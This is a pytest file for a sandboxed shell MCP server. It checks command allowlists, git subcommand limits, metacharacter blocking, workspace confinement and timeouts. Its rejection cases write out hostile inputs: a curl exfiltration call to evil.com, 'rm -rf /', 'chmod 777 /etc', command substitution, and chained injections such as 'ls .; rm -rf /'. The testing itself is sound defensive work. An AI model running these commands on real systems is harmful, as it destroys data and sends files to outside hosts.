"""Shell MCP server 契约测试（SPEC §3.7.4）。

守护点：
- 命令 allowlist：仅 pytest / ruff / mypy / git / cat / ls 允许
- 子命令二级白名单：git 只允许 status / diff / log / show
- 元字符黑名单：& ; | ` > < $( MUST 抛 ValueError
- subprocess.run(shell=False)（验证 argv 走 list，不走字符串拼接）
- cwd 必须在 WORKSPACE_ROOT 内
- 30s 超时：mock subprocess.run 抛 TimeoutExpired → 转 TimeoutError

不依赖 docker；用 tmp_path + monkeypatch 模拟沙箱，mock subprocess.run。
"""

from __future__ import annotations

import subprocess
from pathlib import Path
from unittest.mock import patch

import pytest

from mcp_servers.shell.server import (
    _COMMAND_ALLOWLIST,
    _DEFAULT_TIMEOUT_S,
    _FORBIDDEN_CHARS,
    _SUBCOMMAND_WHITELIST,
    _mcp,
    _resolve_cwd,
    _validate_command,
    run_command,
)

# ============================================================
# 公共 fixture
# ============================================================


@pytest.fixture
def workspace(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """WORKSPACE_ROOT 指向 tmp_path，预置一些目录。"""
    monkeypatch.setenv("WORKSPACE_ROOT", str(tmp_path))
    (tmp_path / "samples").mkdir()
    (tmp_path / "samples" / "calc.py").write_text("x = 1\n", encoding="utf-8")
    return tmp_path


def _fake_completed_process(
    returncode: int = 0, stdout: str = "", stderr: str = ""
) -> subprocess.CompletedProcess[str]:
    return subprocess.CompletedProcess(
        args=["fake"], returncode=returncode, stdout=stdout, stderr=stderr
    )


# ============================================================
# 工具注册
# ============================================================


class TestToolRegistration:
    def _tool_names(self) -> set[str]:
        return set(_mcp._tool_manager._tools.keys())

    def test_has_run_command(self) -> None:
        assert "run_command" in self._tool_names()


# ============================================================
# allowlist 校验（SPEC §3.7.4 安全 MUST）
# ============================================================


class TestCommandAllowlist:
    @pytest.mark.parametrize(
        "cmd",
        # git 单独跑会被子命令白名单拦截，这里只测无子命令白名单的命令
        [c for c in sorted(_COMMAND_ALLOWLIST) if c not in _SUBCOMMAND_WHITELIST],
    )
    def test_allowlist_passes(self, cmd: str) -> None:
        # allowlist 内的命令（裸命令）必须通过；只校验头部，不真正执行
        argv = _validate_command(cmd)
        assert argv[0] == cmd

    def test_git_with_allowed_subcommand_passes(self) -> None:
        """git 在子命令白名单中，必须配 status/diff/log/show 才通过。"""
        argv = _validate_command("git status")
        assert argv[:2] == ["git", "status"]

    def test_unknown_command_rejected(self) -> None:
        with pytest.raises(ValueError, match="not_in_allowlist"):
            _validate_command("rm -rf /")

    def test_curl_rejected(self) -> None:
        """网络工具不在 allowlist。"""
        with pytest.raises(ValueError, match="not_in_allowlist"):
            _validate_command("curl http://evil.com/exfil")

    def test_python_rejected(self) -> None:
        """python REPL 也不在 allowlist（防绕过）。

        注：用无元字符的命令测 allowlist；带 ``;`` 的会被 metachar 先拦截。
        """
        with pytest.raises(ValueError, match="not_in_allowlist"):
            _validate_command("python -V")

    def test_chmod_rejected(self) -> None:
        with pytest.raises(ValueError, match="not_in_allowlist"):
            _validate_command("chmod 777 /etc")


# ============================================================
# 子命令二级白名单（git）
# ============================================================


class TestSubcommandWhitelist:
    @pytest.mark.parametrize("sub", sorted(_SUBCOMMAND_WHITELIST["git"]))
    def test_allowed_git_subcommands(self, sub: str) -> None:
        argv = _validate_command(f"git {sub}")
        assert argv[0] == "git"
        assert argv[1] == sub

    @pytest.mark.parametrize(
        "sub",
        ["push", "pull", "checkout", "reset", "rebase", "merge", "clone", "config"],
    )
    def test_forbidden_git_subcommands(self, sub: str) -> None:
        with pytest.raises(ValueError, match="subcommand_not_allowed"):
            _validate_command(f"git {sub}")

    def test_git_without_subcommand_rejected(self) -> None:
        """裸 git 也不在子命令白名单（_SUBCOMMAND_WHITELIST 有 git 时强制要求子命令）。"""
        with pytest.raises(ValueError, match="subcommand_not_allowed"):
            _validate_command("git")


# ============================================================
# 元字符黑名单（SPEC §3.7.4 安全 MUST）
# ============================================================


class TestMetacharBlacklist:
    @pytest.mark.parametrize("char", _FORBIDDEN_CHARS)
    def test_each_forbidden_char_rejected(self, char: str) -> None:
        # 用合法命令拼上元字符
        cmd = f"ls .{char}evil"
        with pytest.raises(ValueError, match="shell_metachar_forbidden"):
            _validate_command(cmd)

    def test_pipes_rejected(self) -> None:
        with pytest.raises(ValueError, match="shell_metachar_forbidden"):
            _validate_command("cat x | grep secret")

    def test_redirect_rejected(self) -> None:
        with pytest.raises(ValueError, match="shell_metachar_forbidden"):
            _validate_command("cat x > /tmp/leak")

    def test_command_substitution_rejected(self) -> None:
        with pytest.raises(ValueError, match="shell_metachar_forbidden"):
            _validate_command("ls $(whoami)")

    def test_background_rejected(self) -> None:
        with pytest.raises(ValueError, match="shell_metachar_forbidden"):
            _validate_command("ls &")

    def test_empty_command_rejected(self) -> None:
        with pytest.raises(ValueError, match="command is required"):
            _validate_command("")

    def test_whitespace_only_rejected(self) -> None:
        with pytest.raises(ValueError, match="command is required"):
            _validate_command("   ")


# ============================================================
# shell=False 保证（参数化边界）
# ============================================================


class TestArgvParsing:
    def test_returns_list_not_string(self) -> None:
        argv = _validate_command("ls -la samples")
        assert isinstance(argv, list)
        assert argv == ["ls", "-la", "samples"]

    def test_quoted_argument_preserved(self) -> None:
        # shlex 会保留带空格的参数（用单引号）
        argv = _validate_command("cat 'samples/my file.txt'")
        assert argv == ["cat", "samples/my file.txt"]

    def test_no_shell_injection_via_quoted_metachar(self) -> None:
        """引号内的元字符也已被前置黑名单拦截。"""
        with pytest.raises(ValueError, match="shell_metachar_forbidden"):
            _validate_command("cat 'a; rm -rf /'")


# ============================================================
# cwd 校验（路径逃逸防护）
# ============================================================


class TestCwdResolution:
    def test_dot_resolves_to_root(self, workspace: Path) -> None:
        assert _resolve_cwd(".") == workspace

    def test_relative_subdir(self, workspace: Path) -> None:
        assert _resolve_cwd("samples") == workspace / "samples"

    def test_escape_rejected(self, workspace: Path) -> None:
        with pytest.raises(PermissionError, match="cwd_escape"):
            _resolve_cwd("../../etc")

    def test_not_found_rejected(self, workspace: Path) -> None:
        with pytest.raises(FileNotFoundError, match="cwd_not_found"):
            _resolve_cwd("no_such_dir")

    def test_file_rejected(self, workspace: Path) -> None:
        with pytest.raises(NotADirectoryError, match="cwd_not_directory"):
            _resolve_cwd("samples/calc.py")


# ============================================================
# run_command 行为（mock subprocess.run）
# ============================================================


class TestRunCommand:
    async def test_returns_structured_result(self, workspace: Path) -> None:
        fake = _fake_completed_process(returncode=0, stdout="ok\n", stderr="")
        with patch("mcp_servers.shell.server.subprocess.run", return_value=fake) as mock_run:
            result = await run_command("ls samples")
            assert result["exit_code"] == 0
            assert result["stdout"] == "ok\n"
            assert result["stderr"] == ""
            assert result["argv"] == ["ls", "samples"]
            # 默认 cwd="." 解析到 workspace 根
            assert result["cwd"] == "."

            # 关键：subprocess.run 必须以 list 形式调用，shell=False（默认）
            call_args = mock_run.call_args
            args, kwargs = call_args
            assert isinstance(args[0], list)
            assert kwargs.get("shell") is None or kwargs.get("shell") is False

    async def test_cwd_samples_returns_relative_path(self, workspace: Path) -> None:
        fake = _fake_completed_process(returncode=0, stdout="ok", stderr="")
        with patch("mcp_servers.shell.server.subprocess.run", return_value=fake):
            result = await run_command("ls .", cwd="samples")
            assert result["cwd"] == "samples"

    async def test_subcommand_passes_cwd(self, workspace: Path) -> None:
        fake = _fake_completed_process(returncode=0)
        with patch("mcp_servers.shell.server.subprocess.run", return_value=fake) as mock_run:
            await run_command("ls .", cwd="samples")
            mock_run.assert_called_once()
            kwargs = mock_run.call_args.kwargs
            assert kwargs["cwd"] == str(workspace / "samples")

    async def test_timeout_translates_to_timeouterror(self, workspace: Path) -> None:
        exc = subprocess.TimeoutExpired(cmd=["sleep"], timeout=_DEFAULT_TIMEOUT_S)
        with (
            patch(
                "mcp_servers.shell.server.subprocess.run",
                side_effect=exc,
            ),
            pytest.raises(TimeoutError, match="timeout"),
        ):
            await run_command("ls .")

    async def test_metachar_rejected_before_subprocess(self, workspace: Path) -> None:
        with (
            patch(
                "mcp_servers.shell.server.subprocess.run",
                side_effect=AssertionError("should not run"),
            ),
            pytest.raises(ValueError, match="shell_metachar_forbidden"),
        ):
            await run_command("ls .; rm -rf /")

    async def test_unknown_command_rejected_before_subprocess(self, workspace: Path) -> None:
        with (
            patch(
                "mcp_servers.shell.server.subprocess.run",
                side_effect=AssertionError("should not run"),
            ),
            pytest.raises(ValueError, match="not_in_allowlist"),
        ):
            await run_command("rm -rf .")

    async def test_stdout_truncation(self, workspace: Path) -> None:
        """stdout > 1MB 必须截断。"""
        from mcp_servers.shell.server import _MAX_OUTPUT_BYTES

        huge = "x" * (_MAX_OUTPUT_BYTES + 1000)
        fake = _fake_completed_process(returncode=0, stdout=huge)
        with patch("mcp_servers.shell.server.subprocess.run", return_value=fake):
            result = await run_command("ls .")
            assert "[truncated]" in result["stdout"]
            assert len(result["stdout"]) <= _MAX_OUTPUT_BYTES + len("\n[truncated]")
